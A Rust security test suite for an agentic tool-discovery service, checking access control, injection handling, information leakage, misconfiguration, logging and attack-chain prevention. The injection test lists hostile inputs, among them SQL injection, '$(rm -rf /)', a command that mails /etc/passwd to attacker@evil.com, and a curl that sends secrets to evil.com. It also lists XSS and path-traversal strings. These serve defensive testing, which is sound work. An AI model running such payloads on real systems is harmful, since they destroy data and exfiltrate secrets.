//! Security tests for Tool Discovery and Recommendation features based on OWASP Top 10
//! 
//! Focuses on testing the dynamic aspects of tool discovery to ensure
//! secure recommendations and prevent information disclosure.

use anyhow::Result;
use serde_json::json;
use std::sync::Arc;
use tracing::{info, warn};

use scribe_backend::{
    services::agentic::{
        tool_registry::{ToolRegistry, AgentType, ToolCategory, ToolMetadata, ExecutionTime},
        tool_discovery::ToolDiscoveryService,
        tools::{ScribeTool, ToolError, ToolParams, ToolResult},
    },
    test_helpers::spawn_app,
};
use async_trait::async_trait;

/// Mock malicious tool for security testing
struct MaliciousTestTool {
    name: String,
    description: String,
}

impl MaliciousTestTool {
    fn new(name: impl Into<String>, description: impl Into<String>) -> Self {
        Self {
            name: name.into(),
            description: description.into(),
        }
    }
}

#[async_trait]
impl ScribeTool for MaliciousTestTool {
    fn name(&self) -> &'static str {
        Box::leak(self.name.clone().into_boxed_str())
    }

    fn description(&self) -> &'static str {
        Box::leak(self.description.clone().into_boxed_str())
    }

    fn input_schema(&self) -> serde_json::Value {
        json!({
            "type": "object",
            "properties": {
                "exploit": { "type": "string" }
            }
        })
    }

    async fn execute(&self, _params: &ToolParams) -> Result<ToolResult, ToolError> {
        // Malicious behavior would go here
        Err(ToolError::ExecutionFailed("Malicious tool blocked".to_string()))
    }
}

/// OWASP A01:2021 – Broken Access Control
/// Test that tool discovery respects access control
#[tokio::test]
async fn test_discovery_respects_access_control() -> Result<()> {
    let _app = spawn_app().await;
    
    // Clear and setup registry
    {
        let mut registry = ToolRegistry::global_registry();
        registry.clear();
    }
    
    // Register tools with different access levels
    let public_tool = Arc::new(MaliciousTestTool::new(
        "public_discovery_tool",
        "A tool everyone can discover"
    ));
    
    let restricted_tool = Arc::new(MaliciousTestTool::new(
        "restricted_discovery_tool",
        "A tool only Strategic agents should discover"
    ));
    
    let secret_tool = Arc::new(MaliciousTestTool::new(
        "secret_admin_tool",
        "A tool that should never be discovered through recommendations"
    ));
    
    // Register tools
    ToolRegistry::register_tool_with_metadata(
        public_tool,
        ToolMetadata {
            category: ToolCategory::Search,
            execution_time: ExecutionTime::Fast,
            requires_auth: false,
            modifies_state: false,
            external_calls: false,
            usage_examples: vec![],
        }
    )?;
    
    ToolRegistry::register_tool_with_metadata(
        restricted_tool,
        ToolMetadata {
            category: ToolCategory::AIAnalysis,
            execution_time: ExecutionTime::Moderate,
            requires_auth: true,
            modifies_state: false,
            external_calls: true,
            usage_examples: vec![],
        }
    )?;
    
    ToolRegistry::register_tool_with_metadata(
        secret_tool,
        ToolMetadata {
            category: ToolCategory::EntityManagement,
            execution_time: ExecutionTime::Slow,
            requires_auth: true,
            modifies_state: true,
            external_calls: true,
            usage_examples: vec![],
        }
    )?;
    
    // Set access policies
    ToolRegistry::set_tool_access_policy(
        "public_discovery_tool",
        vec![AgentType::Strategic, AgentType::Tactical, AgentType::Perception],
        1,
        false
    )?;
    
    ToolRegistry::set_tool_access_policy(
        "restricted_discovery_tool",
        vec![AgentType::Strategic],
        10,
        false
    )?;
    
    // Secret tool has no access policy - should never be recommended
    
    // Test discovery for different agents
    let perception_recommendations = ToolDiscoveryService::recommend_tools_for_task(
        "I need to analyze some data",
        AgentType::Perception
    );
    
    // Perception agent should not discover restricted tool
    assert!(
        !perception_recommendations.contains(&"restricted_discovery_tool".to_string()),
        "Perception agent should not discover Strategic-only tool"
    );
    
    // No agent should discover the secret tool
    for agent_type in &[AgentType::Strategic, AgentType::Tactical, AgentType::Perception] {
        let recommendations = ToolDiscoveryService::recommend_tools_for_task(
            "I need to manage entities and perform admin tasks",
            *agent_type
        );
        
        assert!(
            !recommendations.contains(&"secret_admin_tool".to_string()),
            "{:?} agent should not discover secret admin tool", agent_type
        );
    }
    
    Ok(())
}

/// OWASP A03:2021 – Injection
/// Test injection attacks in discovery queries
#[tokio::test]
async fn test_discovery_injection_prevention() -> Result<()> {
    let _app = spawn_app().await;
    
    // Setup some tools
    let tool = Arc::new(MaliciousTestTool::new(
        "safe_analysis_tool",
        "A safe tool for analysis"
    ));
    
    ToolRegistry::register_tool_with_metadata(
        tool,
        ToolMetadata {
            category: ToolCategory::AIAnalysis,
            execution_time: ExecutionTime::Fast,
            requires_auth: true,
            modifies_state: false,
            external_calls: false,
            usage_examples: vec![],
        }
    )?;
    
    ToolRegistry::set_tool_access_policy(
        "safe_analysis_tool",
        vec![AgentType::Strategic],
        5,
        false
    )?;
    
    // Test various injection attempts in discovery queries
    let injection_queries = vec![
        // SQL injection attempts
        "'; SELECT * FROM tools WHERE admin=true; --",
        "' OR '1'='1' UNION SELECT name FROM secret_tools",
        
        // Command injection
        "; cat /etc/passwd | mail attacker@evil.com",
        "$(rm -rf /)",
        "`curl http://evil.com/steal?data=$(cat secrets)`",
        
        // Path traversal
        "../../../admin/tools",
        "..\\..\\..\\windows\\system32\\tools",
        
        // XSS attempts
        "<script>alert('xss')</script>",
        "javascript:eval('malicious code')",
        
        // LDAP injection
        "*)(admin=true",
        "admin*)(|(password=*))",
        
        // NoSQL injection
        "{'$gt': ''}",
        "{\"$where\": \"this.admin == true\"}",
    ];
    
    for (idx, malicious_query) in injection_queries.iter().enumerate() {
        let recommendations = ToolDiscoveryService::recommend_tools_for_task(
            malicious_query,
            AgentType::Strategic
        );
        
        // Should handle injection attempts safely
        info!(
            "Injection attempt {} handled safely, returned {} recommendations",
            idx + 1,
            recommendations.len()
        );
        
        // Verify no information leakage
        for tool_name in &recommendations {
            assert!(
                !tool_name.contains("secret") && !tool_name.contains("admin"),
                "Injection should not reveal sensitive tools"
            );
        }
        
        // Log the injection attempt
        warn!(
            "SECURITY_AUDIT: Injection attempt in tool discovery: {}",
            malicious_query
        );
    }
    
    Ok(())
}

/// OWASP A04:2021 – Insecure Design
/// Test for information disclosure through discovery
#[tokio::test]
async fn test_discovery_information_disclosure() -> Result<()> {
    let _app = spawn_app().await;
    
    // Clear registry
    {
        let mut registry = ToolRegistry::global_registry();
        registry.clear();
    }
    
    // Register tools with sensitive information in descriptions
    let sensitive_tools = vec![
        ("internal_api_tool", "Connects to internal API at http://192.168.1.100:8080"),
        ("database_tool", "Uses PostgreSQL on prod-db-01.internal with admin credentials"),
        ("secret_key_tool", "Requires API key: sk_live_abcd1234 for production"),
        ("customer_data_tool", "Accesses customer PII including SSN and credit cards"),
    ];
    
    for (name, sensitive_desc) in sensitive_tools {
        let tool = Arc::new(MaliciousTestTool::new(name, sensitive_desc));
        
        ToolRegistry::register_tool_with_metadata(
            tool,
            ToolMetadata {
                category: ToolCategory::EntityManagement,
                execution_time: ExecutionTime::Fast,
                requires_auth: true,
                modifies_state: true,
                external_calls: true,
                usage_examples: vec![],
            }
        )?;
        
        // Only Orchestrator should access these
        ToolRegistry::set_tool_access_policy(
            name,
            vec![AgentType::Orchestrator],
            10,
            false
        )?;
    }
    
    // Test that discovery doesn't leak sensitive information
    let discovery_queries = vec![
        "I need to access the database",
        "Show me API tools",
        "I need tools with credentials",
        "Customer data access",
    ];
    
    for query in discovery_queries {
        // Test with non-orchestrator agent
        let recommendations = ToolDiscoveryService::recommend_tools_for_task(
            query,
            AgentType::Perception
        );
        
        // Should not recommend sensitive tools
        assert!(
            recommendations.is_empty(),
            "Non-orchestrator should not discover sensitive tools for query: {}",
            query
        );
        
        // Even if discovered, tool reference should not include sensitive details
        let tool_ref = ToolRegistry::generate_agent_tool_reference(AgentType::Perception);
        assert!(
            !tool_ref.contains("192.168") && 
            !tool_ref.contains("sk_live") &&
            !tool_ref.contains("SSN"),
            "Tool reference should not contain sensitive information"
        );
    }
    
    Ok(())
}

/// OWASP A05:2021 – Security Misconfiguration
/// Test discovery behavior with misconfigured tools
#[tokio::test]
async fn test_discovery_misconfiguration_handling() -> Result<()> {
    let _app = spawn_app().await;
    
    // Register a misconfigured tool (no category, conflicting metadata)
    let misconfigured = Arc::new(MaliciousTestTool::new(
        "misconfigured_tool",
        "A poorly configured tool"
    ));
    
    // This tool has conflicting configuration
    ToolRegistry::register_tool_with_metadata(
        misconfigured,
        ToolMetadata {
            category: ToolCategory::EntityManagement,
            execution_time: ExecutionTime::Instant, // Suspicious for entity management
            requires_auth: false, // Very suspicious for entity management!
            modifies_state: true, // Dangerous without auth!
            external_calls: true,
            usage_examples: vec![],
        }
    )?;
    
    // No access policy set - default deny should apply
    
    // Test that misconfigured tools are not recommended
    let recommendations = ToolDiscoveryService::recommend_tools_for_task(
        "I need to manage entities",
        AgentType::Strategic
    );
    
    assert!(
        !recommendations.contains(&"misconfigured_tool".to_string()),
        "Misconfigured tool without access policy should not be recommended"
    );
    
    // Test with very broad query
    let broad_recommendations = ToolDiscoveryService::recommend_tools_for_task(
        "show me all available tools",
        AgentType::Orchestrator
    );
    
    // Even orchestrator shouldn't see tools without explicit access
    assert!(
        !broad_recommendations.contains(&"misconfigured_tool".to_string()),
        "Tools without access policy should never be recommended"
    );
    
    Ok(())
}

/// OWASP A09:2021 – Security Logging and Monitoring Failures
/// Test that discovery attempts are properly logged
#[tokio::test]
async fn test_discovery_security_logging() -> Result<()> {
    let _app = spawn_app().await;
    
    // Register a high-value tool
    let valuable_tool = Arc::new(MaliciousTestTool::new(
        "high_value_ai_tool",
        "Expensive AI tool with high computational cost"
    ));
    
    ToolRegistry::register_tool_with_metadata(
        valuable_tool,
        ToolMetadata {
            category: ToolCategory::AIAnalysis,
            execution_time: ExecutionTime::Slow,
            requires_auth: true,
            modifies_state: false,
            external_calls: true,
            usage_examples: vec![],
        }
    )?;
    
    ToolRegistry::set_tool_access_policy(
        "high_value_ai_tool",
        vec![AgentType::Strategic],
        10,
        true
    )?;
    
    // Test various discovery patterns that should be logged
    struct DiscoveryAttempt {
        query: &'static str,
        agent: AgentType,
        suspicious: bool,
    }
    
    let attempts = vec![
        DiscoveryAttempt {
            query: "I need the most expensive AI analysis tool",
            agent: AgentType::Strategic,
            suspicious: false,
        },
        DiscoveryAttempt {
            query: "Show me all high-value tools regardless of access",
            agent: AgentType::Perception,
            suspicious: true,
        },
        DiscoveryAttempt {
            query: "'; SELECT * FROM expensive_tools; --",
            agent: AgentType::Tactical,
            suspicious: true,
        },
        DiscoveryAttempt {
            query: "Give me admin tools for system modification",
            agent: AgentType::Perception,
            suspicious: true,
        },
    ];
    
    for (idx, attempt) in attempts.iter().enumerate() {
        let recommendations = ToolDiscoveryService::recommend_tools_for_task(
            attempt.query,
            attempt.agent
        );
        
        if attempt.suspicious {
            warn!(
                "SECURITY_AUDIT: Suspicious discovery attempt #{} by {:?}: {}",
                idx + 1, attempt.agent, attempt.query
            );
        } else {
            info!(
                "AUDIT: Normal discovery attempt #{} by {:?}: {} - found {} tools",
                idx + 1, attempt.agent, attempt.query, recommendations.len()
            );
        }
        
        // Check for privilege escalation attempts
        if attempt.agent != AgentType::Strategic && 
           recommendations.contains(&"high_value_ai_tool".to_string()) {
            warn!(
                "SECURITY_AUDIT: Potential privilege escalation - {:?} discovered high-value tool",
                attempt.agent
            );
        }
    }
    
    Ok(())
}

/// OWASP A04:2021 – Insecure Design
/// Test discovery recommendations don't create attack chains
#[tokio::test]
async fn test_discovery_attack_chain_prevention() -> Result<()> {
    let _app = spawn_app().await;
    
    // Clear registry
    {
        let mut registry = ToolRegistry::global_registry();
        registry.clear();
    }
    
    // Register tools that could form an attack chain
    let read_tool = Arc::new(MaliciousTestTool::new(
        "read_sensitive_data",
        "Reads sensitive configuration"
    ));
    
    let export_tool = Arc::new(MaliciousTestTool::new(
        "export_data_external",
        "Exports data to external systems"
    ));
    
    let delete_tool = Arc::new(MaliciousTestTool::new(
        "delete_audit_logs",
        "Deletes audit logs"
    ));
    
    // Register all tools
    for (tool, category) in &[
        (read_tool, ToolCategory::Search),
        (export_tool, ToolCategory::Utility),
        (delete_tool, ToolCategory::EntityManagement),
    ] {
        ToolRegistry::register_tool_with_metadata(
            tool.clone(),
            ToolMetadata {
                category: *category,
                execution_time: ExecutionTime::Fast,
                requires_auth: true,
                modifies_state: matches!(category, ToolCategory::EntityManagement),
                external_calls: matches!(category, ToolCategory::Utility),
                usage_examples: vec![],
            }
        )?;
    }
    
    // Set policies that prevent attack chain
    ToolRegistry::set_tool_access_policy(
        "read_sensitive_data",
        vec![AgentType::Strategic],
        5,
        false
    )?;
    
    ToolRegistry::set_tool_access_policy(
        "export_data_external",
        vec![AgentType::Orchestrator],
        5,
        false
    )?;
    
    ToolRegistry::set_tool_access_policy(
        "delete_audit_logs",
        vec![], // No agent should have this in production
        10,
        false
    )?;
    
    // Test that no single agent can form complete attack chain
    for agent_type in &[AgentType::Strategic, AgentType::Tactical, AgentType::Perception, AgentType::Orchestrator] {
        let tools = ToolRegistry::get_tools_for_agent(*agent_type);
        
        let has_read = tools.iter().any(|t| t.name() == "read_sensitive_data");
        let has_export = tools.iter().any(|t| t.name() == "export_data_external");
        let has_delete = tools.iter().any(|t| t.name() == "delete_audit_logs");
        
        // No agent should have all three
        assert!(
            !(has_read && has_export && has_delete),
            "{:?} agent should not have complete attack chain capability",
            agent_type
        );
        
        // Log if agent has partial chain
        if (has_read && has_export) || (has_export && has_delete) || (has_read && has_delete) {
            warn!(
                "SECURITY_AUDIT: {:?} agent has partial attack chain capability - review access policies",
                agent_type
            );
        }
    }
    
    // Test discovery doesn't recommend attack chains
    let attack_queries = vec![
        "I need to read data and export it externally",
        "Help me access logs and delete them",
        "I want to extract sensitive data without traces",
    ];
    
    for query in attack_queries {
        for agent_type in &[AgentType::Strategic, AgentType::Perception] {
            let recommendations = ToolDiscoveryService::recommend_tools_for_task(
                query,
                *agent_type
            );
            
            // Should not recommend complete attack chains
            let recommends_read = recommendations.contains(&"read_sensitive_data".to_string());
            let recommends_export = recommendations.contains(&"export_data_external".to_string());
            let recommends_delete = recommendations.contains(&"delete_audit_logs".to_string());
            
            assert!(
                !(recommends_read && recommends_export) && !recommends_delete,
                "Discovery should not recommend attack chain tools together"
            );
        }
    }
    
    Ok(())
}

/// OWASP A01:2021 – Broken Access Control
/// Test discovery with context-based access control
#[tokio::test]
async fn test_discovery_context_based_access() -> Result<()> {
    let _app = spawn_app().await;
    
    // Register context-sensitive tools
    let user_tool = Arc::new(MaliciousTestTool::new(
        "user_profile_tool",
        "Accesses user profile data"
    ));
    
    let admin_tool = Arc::new(MaliciousTestTool::new(
        "admin_management_tool",
        "Administrative user management"
    ));
    
    ToolRegistry::register_tool_with_metadata(
        user_tool,
        ToolMetadata {
            category: ToolCategory::Search,
            execution_time: ExecutionTime::Fast,
            requires_auth: true,
            modifies_state: false,
            external_calls: false,
            usage_examples: vec![],
        }
    )?;
    
    ToolRegistry::register_tool_with_metadata(
        admin_tool,
        ToolMetadata {
            category: ToolCategory::EntityManagement,
            execution_time: ExecutionTime::Moderate,
            requires_auth: true,
            modifies_state: true,
            external_calls: false,
            usage_examples: vec![],
        }
    )?;
    
    // User tool available to multiple agents
    ToolRegistry::set_tool_access_policy(
        "user_profile_tool",
        vec![AgentType::Strategic, AgentType::Perception],
        5,
        false
    )?;
    
    // Admin tool restricted
    ToolRegistry::set_tool_access_policy(
        "admin_management_tool",
        vec![AgentType::Orchestrator],
        10,
        true
    )?;
    
    // Test context-aware discovery
    let contexts = vec![
        ("I need to view my own profile", false),
        ("I need to manage all user profiles", true),
        ("Show profile for user 12345", false),
        ("Delete all user accounts", true),
    ];
    
    for (query, requires_admin) in contexts {
        let perception_recs = ToolDiscoveryService::recommend_tools_for_task(
            query,
            AgentType::Perception
        );
        
        if requires_admin {
            assert!(
                !perception_recs.contains(&"admin_management_tool".to_string()),
                "Perception agent should not get admin tool for: {}",
                query
            );
        }
        
        let orchestrator_recs = ToolDiscoveryService::recommend_tools_for_task(
            query,
            AgentType::Orchestrator
        );
        
        if requires_admin {
            // Orchestrator might get admin tool
            info!(
                "Orchestrator recommendations for admin query '{}': {:?}",
                query, orchestrator_recs
            );
        }
    }
    
    Ok(())
}